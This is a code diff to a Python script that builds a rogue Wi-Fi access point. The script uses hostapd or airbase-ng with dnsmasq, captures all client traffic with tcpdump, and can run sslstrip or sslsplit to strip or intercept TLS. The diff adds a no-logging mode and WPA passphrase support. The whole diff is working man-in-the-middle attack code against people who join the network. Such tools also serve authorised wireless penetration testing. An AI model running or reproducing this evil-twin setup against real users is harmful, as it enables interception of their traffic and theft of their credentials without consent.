@@ -138,7 +138,9 @@ null = open("/dev/null", "w")
 parser = argparse.ArgumentParser()
 parser.add_argument("wlan_interface", help="The Interface in monitor mode interface", type=str)
 parser.add_argument("inet_interface", help="The Interface in monitor mode interface", type=str)
+parser.add_argument("--nolog", help="Don't log anything! (usefull form making a non rogue AP)", action="store_true")
 parser.add_argument("--ssid", help="Use this ssid for network (default = using airbase)", type=str)
+parser.add_argument("--wpa", help="Sets up an wpa(2) AP with specified pasphrase", type=str)
 parser.add_argument("--channel", help="Use this channel (default: current channel)", type=int)
 parser.add_argument("--sslstrip", help="Use sslstrip", action="store_true")
 parser.add_argument("--sslsplit", help="Use sslsplit", action="store_true")
@@ -166,8 +168,12 @@ if not check_dnsmasq(): die("dnsmasq command absent or broken")
 
 if args.ssid:
     if not check_hostapd(): die("hostapd command absent or broken")
+    if args.wpa: 
+        if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("wpa passpharase nbeeds to be 8-63 characters")
+        
 else:
     if not check_airbase(): die("airbase-ng command absent or broken")    
+    if args.wpa: die("can only use wpa with an ssid set.")
     
 if args.sslstrip: 
     if not check_sslstrip(): die("sslstrip command absent or broken")
@@ -184,7 +190,18 @@ if not poll_iface_exists(args.inet_interface): die("%s is not a valid interface"
 
 ## read settings form stdin:
 print "Read settings from stdin, send EOF to continue"
-settings = {"ip": "10.55.66.1", "netmask": "255.255.255.0", "dhcp-start": "10.55.66.100", "dhcp-stop": "10.55.66.200", "dhcp-lease": "5m", "dhcp-gateway": "10.55.66.1", "dhcp-dns": "10.55.66.1", "additional-hosts-file": "/dev/null", "ssl-key": None, "ssl-cert": None}
+settings = {
+"ip": "10.55.66.1", 
+"netmask": "255.255.255.0", 
+"dhcp-start": "10.55.66.100", 
+"dhcp-stop": "10.55.66.200", 
+"dhcp-lease": "5m", 
+"dhcp-gateway": "10.55.66.1", 
+"dhcp-dns": "10.55.66.1", 
+"additional-hosts-file": "/dev/null", 
+"ssl-key": None, 
+"ssl-cert": None
+}
 
 for line in sys.stdin:
     try: #if line fails try the next one
@@ -211,17 +228,20 @@ print ""
 if args.channel:
     subprocess.call(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)] ,stdout=null, stderr=null)
 
-log_path = tempfile.mkdtemp()
-log_path_pcap = os.path.join(log_path, "pcap") 
-os.mkdir(log_path_pcap)
+if not(args.nolog):
+    log_path = tempfile.mkdtemp()
+    log_path_pcap = os.path.join(log_path, "pcap") 
+    os.mkdir(log_path_pcap)
 
 if args.sslstrip: #using sslstrip
-    log_path_sslstrip = os.path.join(log_path, "sslstrip")
-    os.mkdir(log_path_sslstrip)
+    if not(args.nolog):
+        log_path_sslstrip = os.path.join(log_path, "sslstrip")
+        os.mkdir(log_path_sslstrip)
 
 if args.sslsplit: #using sslsplit
-    log_path_sslsplit = os.path.join(log_path, "sslsplit")
-    os.mkdir(log_path_sslsplit)
+    if not(args.nolog):
+        log_path_sslsplit = os.path.join(log_path, "sslsplit")
+        os.mkdir(log_path_sslsplit)
 
     ssl_key = settings["ssl-key"]
     ssl_cert = settings["ssl-cert"]
@@ -268,6 +288,9 @@ if args.ssid: #using hostapd
     f.write("channel=%s\n" % int(args.channel))
     if args.bssid:
         f.write("bssid=%s\n" % args.bssid)
+    if args.wpa:
+        f.write("wpa=3\n")
+        f.write("wpa_passphrase=%s\n" % args.wpa)
     f.close()
 
 n, dnsmasq_path = tempfile.mkstemp()
@@ -317,15 +340,26 @@ try:
 
         subprocess.call(["ifconfig", iface, settings["ip"], "netmask", settings["netmask"], "up"])
 
-        p = subprocess.Popen( ["tcpdump", "-i", iface, "-w", os.path.join(log_path_pcap, str(deathloop_count))] )
+        if args.nolog:
+            p = subprocess.Popen( ["tcpdump", "-i", iface, "-w", "/dev/null"] )
+        else:
+            p = subprocess.Popen( ["tcpdump", "-i", iface, "-w", os.path.join(log_path_pcap, str(deathloop_count))] )
+
         pids.append(p)
 
         if args.sslstrip:
-            p = subprocess.Popen( ["sslstrip", "-a", "-f", "-w", os.path.join(log_path_sslstrip, str(deathloop_count))], stderr=null ) #sslstrip's library is kinda buggy
+            if args.nolog:
+                p = subprocess.Popen( ["sslstrip", "-a", "-f"], stderr=null ) #sslstrip's library is kinda buggy
+            else:
+                p = subprocess.Popen( ["sslstrip", "-a", "-f", "-w", os.path.join(log_path_sslstrip, str(deathloop_count))], stderr=null ) #sslstrip's library is kinda buggy
+
             pids.append(p)
 
         if args.sslsplit:
-            p = subprocess.Popen( ["sslsplit", "-S", log_path_sslsplit, "-k", ssl_key, "-c", ssl_cert, "ssl", "0.0.0.0", "8443"], stderr=null )
+            if args.nolog:
+                p = subprocess.Popen( ["sslsplit", "-F", "/dev/null", "-k", ssl_key, "-c", ssl_cert, "ssl", "0.0.0.0", "8443"], stderr=null )
+            else:
+                p = subprocess.Popen( ["sslsplit", "-S", log_path_sslsplit, "-k", ssl_key, "-c", ssl_cert, "ssl", "0.0.0.0", "8443"], stderr=null )
 
         p = subprocess.Popen( ["dnsmasq", "-d", "-C", dnsmasq_path] )
         pids.append(p)
@@ -382,37 +416,39 @@ if args.ssid: #using hostapd
 
 ##collate all logs and plaace them
 
-#pcap
-pcap_logfiles = []
-for x in range(deathloop_count+1):
-    f = os.path.join(log_path_pcap, str(x))
-    if os.path.isfile(f):
-        pcap_logfiles.append(f)
 
-dest_log = os.path.join(args.logdir, "sniff.pcap")
-subprocess.call(["mergecap", "-w", dest_log] + pcap_logfiles, stdout=null, stderr=null)
-os.chmod(dest_log, 0664)
+if not(args.nolog):
+    #pcap
+    pcap_logfiles = []
+    for x in range(deathloop_count+1):
+        f = os.path.join(log_path_pcap, str(x))
+        if os.path.isfile(f):
+            pcap_logfiles.append(f)
+
+    dest_log = os.path.join(args.logdir, "sniff.pcap")
+    subprocess.call(["mergecap", "-w", dest_log] + pcap_logfiles, stdout=null, stderr=null)
+    os.chmod(dest_log, 0664)
 
 
-if args.sslstrip: #using sslstrip
-    dest_log = os.path.join(args.logdir, "sslstrip.log")
-    with open(dest_log, "ab") as f: 
-        for x in range(deathloop_count+1):
-            logfile = os.path.join(log_path_sslstrip, str(x))
-            if os.path.isfile(logfile):
-                with open( logfile, "r" ) as r:
-                    f.write("\n%s" % r.read())
+    if args.sslstrip: #using sslstrip
+        dest_log = os.path.join(args.logdir, "sslstrip.log")
+        with open(dest_log, "ab") as f: 
+            for x in range(deathloop_count+1):
+                logfile = os.path.join(log_path_sslstrip, str(x))
+                if os.path.isfile(logfile):
+                    with open( logfile, "r" ) as r:
+                        f.write("\n%s" % r.read())
 
-if args.sslsplit: #using sslsplit
-    for filename in os.listdir(log_path_sslsplit):
-        src = os.path.join(log_path_sslsplit, filename)
-        dst = os.path.join(args.logdir, filename)
-        shutil.copyfile(src,dst)
-        os.chmod( dst, 0664 )
-        
+    if args.sslsplit: #using sslsplit
+        for filename in os.listdir(log_path_sslsplit):
+            src = os.path.join(log_path_sslsplit, filename)
+            dst = os.path.join(args.logdir, filename)
+            shutil.copyfile(src,dst)
+            os.chmod( dst, 0664 )
+            
 
-#remove log dit and dns masq settings file
-shutil.rmtree(log_path)
+#remove log dir and dns masq settings file
+if not(args.nolog): shutil.rmtree(log_path)
 os.remove(dnsmasq_path)
 
 if args.ssid: #hostapd
